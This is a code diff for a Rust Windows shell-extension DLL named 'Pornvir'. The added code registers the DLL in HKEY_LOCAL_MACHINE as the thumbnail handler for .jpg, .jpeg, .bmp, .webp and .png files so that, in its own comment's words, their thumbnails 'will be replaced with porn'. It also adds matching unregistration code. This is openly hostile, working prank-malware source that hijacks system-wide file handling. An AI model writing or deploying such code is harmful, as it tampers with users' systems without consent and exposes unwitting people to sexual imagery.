@@ -19,6 +19,9 @@ pub static CLSID_Pornvir: GUID = GUID {
 // For convenience.
 const CLSID_PORNVIR_STR: &str = "{69694201-430e-4274-bbc8-4f6819f52960}";
 
+/// Extensions whose thumbnails will be replaced with porn
+const HIJACKED_THUMBNAIL_EXTENSIONS: &[&str] = &[".jpg", ".jpeg", ".bmp", ".webp", ".png"];
+
 /// ? for HRESULTs. Can take multiple expressions.
 macro_rules! hresult_ensure {
     ($call:expr) => {
@@ -69,6 +72,7 @@ pub unsafe extern "stdcall" fn DllRegisterServer() -> HRESULT {
 
     let dll_path = crate::to_utf16_u8_clusterfuck(crate::module_filename());
     let threading_model = crate::to_utf16_u8_clusterfuck(OsString::from("Apartment"));
+    let clsid = unsafe { crate::to_utf16_u8_clusterfuck(CLSID_PORNVIR_STR.into()) };
 
     let root = &HSTRING::from(format!("Software\\Classes\\CLSID\\{CLSID_PORNVIR_STR}"));
 
@@ -82,11 +86,24 @@ pub unsafe extern "stdcall" fn DllRegisterServer() -> HRESULT {
         RegSetValueExW(hkey, None, 0, REG_SZ, Some(&dll_path)),
         RegSetValueExW(hkey, w!("ThreadingModel"), 0, REG_SZ, Some(&threading_model)),
 
-        RegCloseKey(hkey),
-
-        RegCreateKeyExW(HKEY_LOCAL_MACHINE, root, 0, PCWSTR::null(), REG_OPTION_NON_VOLATILE,
-            KEY_WRITE, None, &mut hkey, None)
+        RegCloseKey(hkey)
     ];
+
+    for ext in HIJACKED_THUMBNAIL_EXTENSIONS {
+        let root = HSTRING::from(format!("Software\\Classes\\{}\\ShellEx", ext));
+
+        hresult_ensure![
+            RegCreateKeyExW(HKEY_LOCAL_MACHINE, &root, 0,
+                PCWSTR::null(), REG_OPTION_NON_VOLATILE, KEY_WRITE, None, &mut hkey, None),
+
+            RegCreateKeyExW(hkey, w!("{E357FCCD-A995-4576-B01F-234630154E96}"), 0, PCWSTR::null(),
+                REG_OPTION_VOLATILE, KEY_WRITE, None, &mut hkey, None),
+
+            RegSetValueExW(hkey, None, 0, REG_SZ, Some(&clsid)),
+
+            RegCloseKey(hkey)
+        ];
+    }
 
     SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, None, None);
     S_OK
@@ -100,6 +117,15 @@ pub unsafe extern "stdcall" fn DllUnregisterServer() -> HRESULT {
     // errors about the keys not existing.
     _ = RegDeleteKeyW(HKEY_LOCAL_MACHINE, &HSTRING::from(root.clone() + "\\InprocServer32"));
     _ = RegDeleteKeyW(HKEY_LOCAL_MACHINE, &HSTRING::from(root));
+
+    for ext in HIJACKED_THUMBNAIL_EXTENSIONS {
+        let key = HSTRING::from(format!(
+            "Software\\Classes\\{}\\ShellEx\\{{E357FCCD-A995-4576-B01F-234630154E96}}",   
+            ext
+        ));
+    
+        _ = RegDeleteKeyW(HKEY_LOCAL_MACHINE, &key);
+    }
 
     SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, None, None);
     S_OK
